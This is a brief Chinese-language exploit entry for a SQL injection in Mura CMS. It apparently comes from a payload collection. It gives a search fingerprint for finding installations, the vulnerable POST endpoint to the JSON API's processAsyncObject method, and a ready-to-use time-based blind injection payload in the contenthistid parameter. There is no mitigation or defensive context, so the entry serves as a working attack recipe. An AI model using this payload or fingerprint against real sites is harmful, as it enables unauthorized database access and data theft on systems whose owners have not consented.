# MuraCMS存在SQL注入

MuraCMS ｜ SQL注入 ｜ —
- **指纹**：`"Mura CMS"`
- **请求**：`POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1`

**Payload**
```
object=displayregion&contenthistid=x%5c' AND (SELECT 3504 FROM (SELECT(SLEEP(6)))MQYa)-- Arrv&previewid=1
```